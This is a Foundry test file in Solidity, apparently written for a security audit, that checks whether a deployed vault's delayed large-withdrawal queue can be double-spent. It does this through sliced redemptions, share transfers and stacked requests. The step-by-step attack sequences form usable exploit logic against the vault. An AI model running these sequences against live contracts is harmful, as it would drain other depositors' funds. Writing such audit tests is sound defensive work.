// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../harness/Mocks.sol";
import "./DeployedArtifactVault.t.sol";

/// @title  Delayed large-withdrawal queue of the deployed artifact vault
/// @notice `withdraw()` above `largeWithdrawalThreshold` does NOT transfer any
///         assets and does NOT burn any shares - it only records a request.
///         These tests probe whether the queued claim can be double-spent.
contract WithdrawalQueueTest is Test {
    IMaonoVaultDeployed internal vault;
    MockERC20 internal asset;

    address internal manager = address(0x333A6E);
    address internal treasury = address(0x7BEA5);
    address internal attacker = address(0xBAD);
    address internal alice = address(0xA71CE);
    address internal bob = address(0xB0B);

    function setUp() public {
        asset = new MockERC20("cUSD", "cUSD", 18);
        bytes memory initCode =
            abi.encodePacked(vm.getCode("contracts/MaonoVault.json"), abi.encode(address(asset), treasury, manager));
        address d;
        assembly {
            d := create(0, add(initCode, 0x20), mload(initCode))
        }
        vault = IMaonoVaultDeployed(d);
        vm.prank(manager);
        vault.setVaultCap(type(uint256).max);
    }

    function _fund(address who, uint256 amount) internal {
        asset.mint(who, amount);
        vm.prank(who);
        asset.approve(address(vault), type(uint256).max);
    }

    // ------------------------------------------------------------------
    // A large withdrawal neither pays out nor burns shares.
    // ------------------------------------------------------------------
    function test_LargeWithdrawalIsRequestOnly() public {
        _fund(bob, 1_000_000e18);
        vm.prank(bob);
        uint256 shares = vault.deposit(500_000e18, bob);

        uint256 assetsBefore = asset.balanceOf(bob);
        vm.prank(bob);
        uint256 ret = vault.withdraw(5_000e18, bob, bob);

        assertEq(asset.balanceOf(bob), assetsBefore, "no assets are paid out");
        assertEq(vault.balanceOf(bob), shares, "no shares are burned");
        console2.log("  withdraw() returned:", ret, "while transferring nothing");

        (address user, uint256 amount,, bool fulfilled) = vault.withdrawalRequests(1);
        assertEq(user, bob);
        assertEq(amount, 5_000e18);
        assertFalse(fulfilled);
    }

    // ------------------------------------------------------------------
    // CRITICAL CANDIDATE: request a large withdrawal, exit all shares
    // through small redemptions, then collect the queued assets as well.
    // ------------------------------------------------------------------
    function test_QueuedWithdrawalDoubleSpend() public {
        // Other users' capital is the source of the loss.
        _fund(alice, 1_000_000e18);
        vm.prank(alice);
        vault.deposit(500_000e18, alice);

        uint256 attackerCapital = 10_000e18;
        _fund(attacker, attackerCapital);
        vm.prank(attacker);
        uint256 shares = vault.deposit(attackerCapital, attacker);

        // 1. Queue a large withdrawal of the full position.
        vm.prank(attacker);
        vault.withdraw(attackerCapital, attacker, attacker);
        (, uint256 queued,,) = vault.withdrawalRequests(1);
        assertEq(queued, attackerCapital, "full position queued");

        // 2. Shares are untouched: redeem them in sub-threshold slices.
        uint256 slice = shares / 20; // each slice is below the 1000e18 threshold
        for (uint256 i = 0; i < 20; ++i) {
            vm.prank(attacker);
            vault.redeem(slice, attacker, attacker);
        }
        uint256 afterExit = asset.balanceOf(attacker);
        console2.log("  capital recovered by redeeming shares:", afterExit);

        // 3. Collect the queued request on top.
        vm.warp(block.timestamp + vault.withdrawalDelay() + 1);
        vm.prank(attacker);
        (bool ok, bytes memory err) = address(vault).call(abi.encodeWithSignature("fulfillWithdrawal(uint256)", 1));

        uint256 ending = asset.balanceOf(attacker);
        console2.log("  fulfillWithdrawal succeeded:", ok);
        console2.log("  attacker starting capital  :", attackerCapital);
        console2.log("  attacker ending capital    :", ending);
        if (!ok) {
            console2.logBytes(err);
        }

        if (ending > attackerCapital) {
            console2.log("  EXTRACTED FROM OTHER DEPOSITORS:", ending - attackerCapital);
        }

        // The economic claim under test: a queued request must not be
        // collectable once the backing shares have already been redeemed.
        assertLe(ending, attackerCapital, "queued request must not be double-spendable");
    }

    // ------------------------------------------------------------------
    // Same idea, but the shares are moved to a second address instead of
    // being redeemed by the requester.
    // ------------------------------------------------------------------
    function test_QueuedWithdrawalAfterTransferringShares() public {
        _fund(alice, 1_000_000e18);
        vm.prank(alice);
        vault.deposit(500_000e18, alice);

        uint256 attackerCapital = 10_000e18;
        _fund(attacker, attackerCapital);
        vm.prank(attacker);
        uint256 shares = vault.deposit(attackerCapital, attacker);

        vm.prank(attacker);
        vault.withdraw(attackerCapital, attacker, attacker);

        vm.prank(attacker);
        vault.transfer(bob, shares); // sell the shares to a third party

        vm.warp(block.timestamp + vault.withdrawalDelay() + 1);
        vm.prank(attacker);
        (bool ok,) = address(vault).call(abi.encodeWithSignature("fulfillWithdrawal(uint256)", 1));
        console2.log("  fulfill after selling shares:", ok);
        console2.log("  attacker assets :", asset.balanceOf(attacker));
        console2.log("  bob still holds :", vault.balanceOf(bob));
        console2.log("  bob claim       :", vault.previewRedeem(vault.balanceOf(bob)));

        uint256 totalClaims = asset.balanceOf(attacker) + vault.previewRedeem(vault.balanceOf(bob));
        console2.log("  attacker payout + buyer claim:", totalClaims);
        assertLe(totalClaims, attackerCapital, "one position must not pay out twice");
    }

    // ------------------------------------------------------------------
    // A request larger than the caller's position IS accepted, but it can
    // never be fulfilled: the share check happens at fulfilment time.
    // ------------------------------------------------------------------
    function test_OversizedRequestIsAcceptedButUnfulfillable() public {
        _fund(alice, 1_000_000e18);
        vm.prank(alice);
        vault.deposit(500_000e18, alice);

        _fund(attacker, 10_000e18);
        vm.prank(attacker);
        vault.deposit(10_000e18, attacker);

        vm.prank(attacker);
        (bool queued,) = address(vault).call(
            abi.encodeWithSignature("withdraw(uint256,address,address)", 400_000e18, attacker, attacker)
        );
        assertTrue(queued, "oversized request is accepted at creation time");

        vm.warp(block.timestamp + vault.withdrawalDelay() + 1);
        uint256 before = asset.balanceOf(attacker);
        vm.prank(attacker);
        (bool ok,) = address(vault).call(abi.encodeWithSignature("fulfillWithdrawal(uint256)", 1));
        assertFalse(ok, "but it cannot be fulfilled");
        assertEq(asset.balanceOf(attacker), before, "no assets extracted");
    }

    // ------------------------------------------------------------------
    // Can the same position be queued repeatedly?
    // ------------------------------------------------------------------
    function test_QueueCannotBeStackedBeyondPosition() public {
        _fund(alice, 1_000_000e18);
        vm.prank(alice);
        vault.deposit(500_000e18, alice);

        uint256 capital = 10_000e18;
        _fund(attacker, capital);
        vm.prank(attacker);
        vault.deposit(capital, attacker);

        for (uint256 i = 0; i < 5; ++i) {
            vm.prank(attacker);
            (bool ok,) = address(vault).call(
                abi.encodeWithSignature("withdraw(uint256,address,address)", capital, attacker, attacker)
            );
            console2.log("  queue attempt", i, "accepted:", ok);
        }

        uint256 requests = vault.withdrawalRequestCounter();
        vm.warp(block.timestamp + vault.withdrawalDelay() + 1);
        for (uint256 id = 1; id <= requests; ++id) {
            vm.prank(attacker);
            address(vault).call(abi.encodeWithSignature("fulfillWithdrawal(uint256)", id));
        }

        uint256 ending = asset.balanceOf(attacker);
        console2.log("  requests queued:", requests);
        console2.log("  attacker ending capital:", ending);
        assertLe(ending, capital, "stacked requests must not multiply the payout");
    }
}
